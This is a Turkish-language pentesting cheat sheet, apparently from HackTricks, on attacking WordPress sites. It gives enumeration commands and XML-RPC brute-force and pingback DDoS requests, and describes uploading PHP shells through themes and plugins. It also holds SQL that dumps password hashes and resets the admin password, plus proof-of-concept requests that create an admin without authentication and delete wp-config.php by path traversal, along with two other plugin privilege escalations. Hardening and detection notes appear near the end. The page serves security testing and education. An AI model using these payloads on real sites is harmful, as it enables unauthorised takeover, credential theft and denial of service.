# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

- **Yüklenen** dosyalar gider: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Tema dosyaları /wp-content/themes/ içinde bulunur,** bu yüzden temanın bazı php dosyalarını değiştirip RCE elde etmeye çalışırsanız muhtemelen bu yolu kullanırsınız. Örneğin: **theme twentytwelve** kullanılarak **404.php** dosyasına şu adreste erişilebilir: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Başka faydalı bir URL şunu olabilir:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php** içinde veritabanının root parolasını bulabilirsiniz.
- Kontrol edilecek varsayılan giriş yolları: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Ana WordPress Dosyaları**

- `index.php`
- `license.txt` yüklenen WordPress sürümü gibi faydalı bilgiler içerir.
- `wp-activate.php` yeni bir WordPress sitesi kurarken e-posta aktivasyon süreci için kullanılır.
- Giriş klasörleri (gizlemek için yeniden adlandırılmış olabilir):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` HTTP taşıma mekanizması ve XML kodlama mekanizması ile veri iletimine olanak sağlayan bir WordPress özelliğini temsil eden bir dosyadır. Bu tür iletişim, WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ile değiştirildi.
- `wp-content` klasörü eklentilerin ve temaların saklandığı ana dizindir.
- `wp-content/uploads/` platforma yüklenen tüm dosyaların saklandığı dizindir.
- `wp-includes/` sertifikalar, yazı tipleri, JavaScript dosyaları ve widget'lar gibi çekirdek dosyaların saklandığı dizindir.
- `wp-sitemap.xml` Wordpress 5.5 ve sonraki sürümlerde, tüm genel gönderileri ve herkese açık sorgulanabilir gönderi türleri ile taksonomileri içeren bir sitemap XML dosyası üretir.

**Post exploitation**

- `wp-config.php` dosyası WordPress'in veritabanına bağlanmak için ihtiyaç duyduğu veritabanı adı, veritabanı hostu, kullanıcı adı ve parola, authentication keys and salts ve veritabanı tablo ön eki gibi bilgileri içerir. Bu yapılandırma dosyası aynı zamanda DEBUG modunu etkinleştirmek için de kullanılabilir; bu, sorun giderme sırasında faydalı olabilir.

### Kullanıcı İzinleri

- **Administrator**
- **Editor**: Kendi ve başkalarının gönderilerini yayınlar ve yönetir
- **Author**: Kendi gönderilerini yayınlar ve yönetir
- **Contributor**: Gönderilerini yazar ve yönetir ancak yayınlayamaz
- **Subscriber**: Gönderileri görüntüler ve profilini düzenler

## **Passive Enumeration**

### **WordPress sürümünü öğrenme**

`/license.txt` veya `/readme.html` dosyalarını bulup bulamayacağınızı kontrol edin

Sayfanın **kaynak kodu** içinde (örnek: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link dosyaları

![](<../../images/image (533).png>)

- JavaScript dosyaları

![](<../../images/image (524).png>)

### Eklentileri Edinin
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Temaları Al
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Genel olarak sürüm bilgilerini çıkarma
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktif keşif

### Plugins and Themes

Muhtemelen tüm Plugins and Themes'i bulamayacaksınız. Hepsini keşfetmek için **actively Brute Force a list of Plugins and Themes** yapmanız gerekecek (umarız bizim için bu listeleri içeren otomatik araçlar vardır).

### Kullanıcılar

- **ID Brute:** Bir WordPress sitesinden geçerli kullanıcıları kullanıcı ID'lerini Brute Forcing yaparak elde edersiniz:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Yanıtlar **200** veya **30X** ise, bu id'nin **geçerli** olduğu anlamına gelir. Yanıt **400** ise, id **geçersizdir**.

- **wp-json:** Kullanıcılar hakkında bilgi almak için ayrıca şu sorguyu deneyebilirsiniz:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Kullanıcılar hakkında bazı bilgiler ortaya çıkarabilecek bir diğer `/wp-json/` endpoint şudur:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Yalnızca bu özelliği etkinleştirmiş kullanıcılar hakkında bilgi sağlanacaktır**.

Ayrıca unutmayın ki **/wp-json/wp/v2/pages** IP adreslerini leak edebilir.

- **Login username enumeration**: **`/wp-login.php`** üzerinden giriş yapılırken gösterilen **mesaj** kullanıcı adının var olup olmadığına göre **farklıdır**.

### XML-RPC

Eğer `xml-rpc.php` aktifse credentials brute-force gerçekleştirebilir veya bunu diğer kaynaklara DoS saldırıları başlatmak için kullanabilirsiniz. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Aktif olup olmadığını görmek için _**/xmlrpc.php**_ adresine erişmeyi deneyin ve şu isteği gönderin:

**Kontrol**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** veya **`metaWeblog.getUsersBlogs`**, credentials'ı brute-force etmek için kullanılabilecek yöntemlerden bazılarıdır. Eğer bunlardan herhangi birini bulursanız şu şekilde bir istek gönderebilirsiniz:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Kimlik bilgileri geçersizse 200 kodlu bir yanıtta _"Incorrect username or password"_ mesajı görünmelidir.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Doğru kimlik bilgilerini kullanarak bir dosya yükleyebilirsiniz. Yanıtta yol görünecektir ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Ayrıca aynı istekte birden fazla kimlik bilgisi deneyebildiğiniz için **`system.multicall`** kullanarak kimlik bilgilerini brute-force etmek için **daha hızlı bir yol** vardır:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Bu yöntem programlar içindir, insanlar için değil; ayrıca eski olduğu için 2FA'yi desteklemez. Yani geçerli kimlik bilgilerine sahipseniz ama ana giriş 2FA ile korunuyorsa, **xmlrpc.php'yi kötüye kullanarak bu kimlik bilgileriyle 2FA'yı atlayarak giriş yapmanız mümkün olabilir**. Konsol üzerinden yapabildiğiniz tüm işlemleri gerçekleştiremeyebilirsiniz, fakat Ippsec'in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) videosunda açıkladığı gibi yine de RCE'ye ulaşmanız mümkün olabilir.

**DDoS or port scanning**

Eğer listede _**pingback.ping**_ metodunu bulabilirseniz, Wordpress'in herhangi bir host/port'a rastgele bir istek göndermesini sağlayabilirsiniz.\
Bu, binlerce **Wordpress** sitesinin tek bir hedefe erişmesini sağlamak için kullanılabilir (böylece o hedefte bir **DDoS** oluşur) veya bunu **Wordpress**'in bazı iç ağları taraması için kullanabilirsiniz (herhangi bir port belirtebilirsiniz).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Eğer **faultCode** değeri **0**'dan (17) **büyük**se, bu portun açık olduğu anlamına gelir.

Önceki bölümdeki **`system.multicall`** kullanımına bakın; bu yöntemi DDoS oluşturmak için nasıl kötüye kullanacağınızı öğrenin.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Bu dosya genellikle Wordpress sitesinin kökünde bulunur: **`/wp-cron.php`**\
Bu dosyaya **erişildiğinde** "**yoğun**" MySQL **sorgusu** çalıştırılır, bu yüzden **saldırganlar** tarafından bir **DoS** oluşturmak için kullanılabilir.\
Ayrıca, varsayılan olarak `wp-cron.php` her sayfa yüklemesinde (bir istemci herhangi bir Wordpress sayfasını istediğinde) çağrılır; bu da yüksek trafiğe sahip sitelerde sorunlara (DoS) yol açabilir.

Wp-Cron'u devre dışı bırakıp, gerekli işlemleri düzenli aralıklarla gerçekleştirecek gerçek bir cronjob'un host içinde oluşturulması önerilir (sorun oluşturmayacak şekilde).

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Bu araç **methodName: pingback.ping** ve yol **/wp-json/oembed/1.0/proxy** olup olmadığını kontrol eder ve mevcutsa bunları istismar etmeye çalışır.

## Otomatik Araçlar
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Bir biti üzerine yazarak erişim sağlama

Gerçek bir saldırıdan çok merak amaçlı bir şeydir. CTF'de [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) herhangi bir wordpress dosyasındaki 1 biti çevirebiliyordunuz. Böylece ` /var/www/html/wp-includes/user.php` dosyasının `5389` konumundaki biti çevirerek NOT (`!`) operasyonunu NOP yapabilirdiniz.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Kullanılan temadaki bir php dosyasını değiştirme (admin kimlik bilgileri gerekli)**

Appearance → Theme Editor → 404 Template (sağda)

İçeriği bir php shell için değiştirin:

![](<../../images/image (384).png>)

Güncellenen sayfaya nasıl erişileceğini internette araştırın. Bu durumda buraya erişmelisiniz: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Şunu kullanabilirsiniz:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
oturum elde etmek için.

## Plugin RCE

### PHP plugin

Bir plugin olarak .php dosyaları yüklemek mümkün olabilir.\
Örneğin şu şekilde bir php backdoor oluşturun:

![](<../../images/image (183).png>)

Sonra yeni bir plugin ekleyin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Muhtemelen görünürde bir şey yapmayacaktır, ancak Media'ya giderseniz shell'inizin yüklendiğini göreceksiniz:

![](<../../images/image (462).png>)

Erişin ve reverse shell'i çalıştırmak için URL'i göreceksiniz:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Bu yöntem, zafiyeti bilinen ve web shell elde etmek için sömürülebilen kötü amaçlı bir plugin'in kurulmasını içerir. Bu işlem WordPress dashboard üzerinden şu şekilde gerçekleştirilir:

1. **Plugin Acquisition**: Plugin, Exploit DB gibi bir kaynaktan şu örnekteki gibi elde edilir: [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard'a gidin, sonra `Dashboard > Plugins > Upload Plugin` yolunu izleyin.
- İndirilen plugin'in zip dosyasını yükleyin.
3. **Plugin Activation**: Plugin başarılı şekilde yüklendikten sonra dashboard üzerinden etkinleştirilmelidir.
4. **Exploitation**:
- "reflex-gallery" plugin'i yüklendiğinde ve etkinleştirildiğinde, zafiyeti bilindiği için sömürülebilir.
- Metasploit framework bu zafiyet için bir exploit sağlar. Uygun modülü yükleyip belirli komutları çalıştırarak bir meterpreter oturumu başlatılabilir ve siteye yetkisiz erişim sağlanabilir.
- Bunun, bir WordPress sitesini sömürmek için kullanılan birçok yöntemden sadece biri olduğu belirtilmelidir.

İçerik, plugin'i yükleme ve etkinleştirme adımlarını gösteren WordPress dashboard'undaki görsel yardımcılar içerir. Ancak, bu tür zafiyetleri yetkisiz olarak sömürmenin yasalara aykırı ve etik olmadığını belirtmek önemlidir. Bu bilgiler sorumlu bir şekilde ve yalnızca açık izinle gerçekleştirilen penetration testing gibi yasal bağlamlarda kullanılmalıdır.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ WordPress'te bir kullanıcı oluşturur.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Özel plugin'inizi (backdoor) WordPress'e yükleyin.
- _**(RCE) Built-In Plugin Edit:**_ WordPress'teki varsayılan plugin'leri düzenleyin.
- _**(RCE) Built-In Theme Edit:**_ WordPress'teki varsayılan theme'leri düzenleyin.
- _**(Custom) Custom Exploits:**_ Üçüncü taraf WordPress plugin/theme'leri için özel Exploit'ler.

## Post Exploitation

Kullanıcı adlarını ve şifreleri çıkartın:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin parolasını değiştir:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Bir Wordpress eklentisinin işlevselliği nasıl açığa çıkardığını bilmek, eklentinin işlevselliğindeki güvenlik açıklarını bulmak için anahtardır. Bir eklentinin nasıl işlevsellik açabileceğini aşağıdaki madde işaretlerinde görebilir ve bazı savunmasız eklenti örneklerini [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) adresinde bulabilirsiniz.

- **`wp_ajax`**

Bir eklentinin fonksiyonlarını kullanıcılara açmasının yollarından biri AJAX handlers aracılığıdır. Bu handler'lar mantık, authorization veya authentication hataları içerebilir. Ayrıca, bu fonksiyonların hem authentication hem de authorization'ı WordPress nonce'unun varlığına dayandırması sık görülen bir durumdur; bu nonce'a **Wordpress instance'ında kimlik doğrulaması yapılmış herhangi bir kullanıcı sahip olabilir** (rolünden bağımsız olarak).

Bir eklentide bir fonksiyonu açığa çıkarmak için kullanılabilecek fonksiyonlar şunlardır:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` kullanımı endpoint'i herhangi bir kullanıcı tarafından (kimliği doğrulanmamış olanlar dahil) erişilebilir kılar.**

> [!CAUTION]
> Ayrıca, eğer fonksiyon sadece `wp_verify_nonce` fonksiyonu ile kullanıcının yetkilendirmesini kontrol ediyorsa, bu fonksiyon genellikle sadece kullanıcının giriş yapıp yapmadığını kontrol eder; genellikle kullanıcının rolünü kontrol etmez. Bu yüzden düşük ayrıcalıklı kullanıcılar yüksek ayrıcalıklı işlemlere erişebilir.

- **REST API**

Ayrıca, `register_rest_route` fonksiyonunu kullanarak wordpress'ten fonksiyonları rest AP kaydederek açığa çıkarmak da mümkündür:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` bir API metodunu çağırmaya yetkili olup olmadığını kontrol eden bir geri çağırma fonksiyonudur.

**Eğer dahili `__return_true` fonksiyonu kullanılırsa, kullanıcı izin kontrollerini tamamen atlayacaktır.**

- **Doğrudan php dosyasına erişim**

Elbette Wordpress PHP kullanır ve eklenti içindeki dosyalar web üzerinden doğrudan erişilebilir. Bu yüzden bir eklenti, yalnızca dosyaya erişilmesiyle tetiklenen herhangi bir güvenlik açığı içeren işlevsellik sunuyorsa, bu herhangi bir kullanıcı tarafından istismar edilebilir.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Bazı eklentiler dahili entegrasyonlar veya reverse proxies için “trusted header” kısayolları uygular ve daha sonra bu header'ı REST istekleri için mevcut kullanıcı bağlamını ayarlamak amacıyla kullanır. Eğer header, upstream bir bileşen tarafından isteğe kriptografik olarak bağlanmamışsa, bir saldırgan bunu sahteleyebilir ve yönetici olarak ayrıcalıklı REST rotalarına erişebilir.

- Etkisi: core users REST route üzerinden yeni bir yönetici oluşturarak kimlik doğrulama olmadan yönetici ayrıcalıklarına yükselme.
- Örnek header: `X-Wcpay-Platform-Checkout-User: 1` (kullanıcı ID'sini 1 olarak zorlar; genellikle ilk yönetici hesabıdır.)
- İstismar edilen rota: `POST /wp-json/wp/v2/users` yükseltilmiş bir rol dizisi ile.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- The plugin maps a client-controlled header to authentication state and skips capability checks.
- WordPress core expects `create_users` capability for this route; the plugin hack bypasses it by directly setting the current user context from the header.

Expected success indicators

- HTTP 201 with a JSON body describing the created user.
- A new admin user visible in `wp-admin/users.php`.

Detection checklist

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Review REST registrations for privileged callbacks that lack robust `permission_callback` checks and instead rely on request headers.
- Look for usages of core user-management functions (`wp_insert_user`, `wp_create_user`) inside REST handlers that are gated only by header values.

### Yetkilendirilmemiş Rastgele Dosya Silme via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress temaları ve eklentileri sıklıkla `wp_ajax_` ve `wp_ajax_nopriv_` hook'ları aracılığıyla AJAX handler'ları açığa çıkarır.  **_nopriv_** varyantı kullanıldığında **geri çağrı yetkilendirilmemiş ziyaretçiler tarafından erişilebilir hale gelir**, bu yüzden herhangi bir hassas işlem ek olarak şunları uygulamalıdır:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Bu kod parçasının ortaya çıkardığı sorunlar:

* **Kimlik doğrulamasız erişim** – `wp_ajax_nopriv_` hook kayıtlı.
* **No nonce / capability check** – herhangi bir ziyaretçi endpoint'e istek gönderebilir.
* **No path sanitisation** – kullanıcı kontrollü `fontfamily` string'i filtrelenmeden bir dosya sistemi yoluna ekleniyor, bu da klasik `../../` traversal'a izin veriyor.

#### İstismar

Bir saldırgan tek bir HTTP POST isteği göndererek **uploads temel dizininin altındaki** (normalde `<wp-root>/wp-content/uploads/`) herhangi bir dosyayı veya dizini silebilir:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Çünkü `wp-config.php` *uploads*'un dışında bulunduğundan, varsayılan kurulumda dört `../` dizisi yeterlidir. `wp-config.php` dosyasını silmek, WordPress'i bir sonraki ziyarette *kurulum sihirbazı*'na sokar ve tam site ele geçirmeye olanak sağlar (saldırgan sadece yeni bir DB yapılandırması sağlar ve bir admin kullanıcı oluşturur).

Diğer etkili hedefler plugin/theme `.php` dosyaları (güvenlik eklentilerini kırmak için) veya `.htaccess` kurallarıdır.

#### Tespit kontrol listesi

* Dosya sistemi yardımcılarını (`copy()`, `unlink()`, `$wp_filesystem->delete()` vb.) çağıran herhangi bir `add_action( 'wp_ajax_nopriv_...')` callback'i.
* Path'lere temizlenmemiş kullanıcı girdisinin eklenmesi (bak: `$_POST`, `$_GET`, `$_REQUEST`).
* `check_ajax_referer()` ve `current_user_can()`/`is_user_logged_in()` yokluğu.

---

### Yetki yükseltme: eskimiş rol geri yükleme ve yetkilendirme eksikliği (ASE "View Admin as Role")

Birçok eklenti, orijinal rol(leri) user meta'da saklayıp daha sonra geri yükleyebilmek için "view as role" veya geçici rol değiştirme özelliği uygular. Eğer geri yükleme yolu yalnızca istek parametrelerine (örn. `$_REQUEST['reset-for']`) ve eklentinin tuttuğu bir listeye dayanıyor, capability kontrolleri ve geçerli bir nonce doğrulaması yoksa bu dikey yetki yükseltmesine dönüşür.

Gerçek dünyadan bir örnek Admin and Site Enhancements (ASE) eklentisinde (≤ 7.6.2.1) bulundu. Reset dalı, kullanıcı adı dahili bir dizi `$options['viewing_admin_as_role_are']` içinde yer alıyorsa `reset-for=<username>` bazında rolleri geri yüklüyordu, ancak mevcut rolleri kaldırıp user meta `_asenha_view_admin_as_original_roles`'den kaydedilmiş rolleri tekrar eklemeden önce ne `current_user_can()` kontrolü ne de nonce doğrulaması yapıyordu:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Neden sömürülebilir

- Sunucu tarafı yetkilendirmesi olmadan `$_REQUEST['reset-for']` ve bir eklenti seçeneğine güvenir.
- Eğer bir kullanıcı daha önce yüksek ayrıcalıklarını `_asenha_view_admin_as_original_roles` içinde kaydetmişse ve daha sonra yetkileri düşürülmüşse, sıfırlama yoluna erişerek bunları geri alabilir.
- Bazı dağıtımlarda, kimliği doğrulanmış herhangi bir kullanıcı `viewing_admin_as_role_are` içinde hâlâ bulunan başka bir kullanıcı adı için sıfırlamayı tetikleyebilir (yetkilendirme hatası).

İstismar (örnek)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Zayıf yapılandırmalarda bu, mevcut rolleri kaldırır ve kaydedilmiş orijinal rolleri (ör. `administrator`) tekrar ekler; bu da etkili şekilde ayrıcalıkları yükseltir.

Detection checklist

- Kullanıcı meta alanında “original roles”i saklayan rol‑değiştirme özelliklerini ara (ör. `_asenha_view_admin_as_original_roles`).
- Şu tür sıfırlama/geri yükleme yollarını belirle:
- Kullanıcı adlarını `$_REQUEST` / `$_GET` / `$_POST` üzerinden okuyan.
- Rolleri `add_role()` / `remove_role()` ile, `current_user_can()` ve `wp_verify_nonce()` / `check_admin_referer()` olmadan değiştiren.
- Yetkilendirmeyi, işlemi yapan kullanıcının yetenekleri yerine bir eklenti seçenek dizisine (ör. `viewing_admin_as_role_are`) dayandıran.

---

### Kimlik doğrulaması olmayan ayrıcalık yükseltmesi via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Bazı eklentiler user‑switching yardımcılarını public `init` hook'una bağlar ve kimliği istemci kontrollü bir çerezden türetir. Eğer kod `wp_set_auth_cookie()`'u kimlik doğrulamasını, capability ve geçerli bir nonce'u doğrulamadan çağırıyorsa, herhangi bir kimliği doğrulanmamış ziyaretçi rastgele bir kullanıcı ID'si olarak zorla oturum açtırabilir.

Tipik savunmasız desen (Service Finder Bookings ≤ 6.1'den basitleştirilmiş):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Neden istismar edilebilir

- Herkese açık `init` hook, handler'ın kimlik doğrulanmamış kullanıcılar tarafından erişilebilir olmasını sağlar (`is_user_logged_in()` koruması yok).
- Kimlik, istemci tarafından değiştirilebilen bir cookie olan `original_user_id` değerinden türetilir.
- Doğrudan `wp_set_auth_cookie($uid)` çağrısı, istekte bulunanı herhangi bir capability/nonce kontrolü olmadan o kullanıcı olarak oturum açtırır.

İstismar (kimlik doğrulanmamış)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---
### WordPress/plugin CVE'leri için WAF hususları

Genel edge/server WAF'ları geniş desenler (SQLi, XSS, LFI) için ayarlanmıştır. Birçok yüksek etkili WordPress/plugin açığı, uygulamaya özgü mantık/auth hatalarıdır ve motor WordPress yollarını ve plugin semantiklerini anlamadıkça zararsız trafik gibi görünür.

Saldırı notları

- Plugin'e özgü endpoint'leri temiz payloadlarla hedefleyin: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Önce kimlik doğrulama gerektirmeyen yolları test edin (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Varsayılan payloadlar genellikle obfuscation olmadan başarılı olur.
- Tipik yüksek etkili durumlar: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Savunma notları

- Plugin CVE'lerini korumak için genel WAF imzalarına güvenmeyin. Uygulama katmanı, açığa özgü sanal yamalar uygulayın veya hızlıca güncelleyin.
- Kodda negatif regex filtreleri yerine pozitif güvenlik kontrollerini tercih edin (capabilities, nonces, strict input validation).

## WordPress Koruması

### Düzenli Güncellemeler

WordPress, plugins ve temaların güncel olduğundan emin olun. Ayrıca wp-config.php içinde otomatik güncellemelerin etkinleştirildiğini doğrulayın:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Ayrıca, **sadece güvenilir WordPress eklentilerini ve temalarını yükleyin**.

### Güvenlik Eklentileri

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Diğer Öneriler**

- Varsayılan **admin** kullanıcısını kaldırın
- **Güçlü parolalar** ve **2FA** kullanın
- Kullanıcıların **izinlerini** periyodik olarak **gözden geçirin**
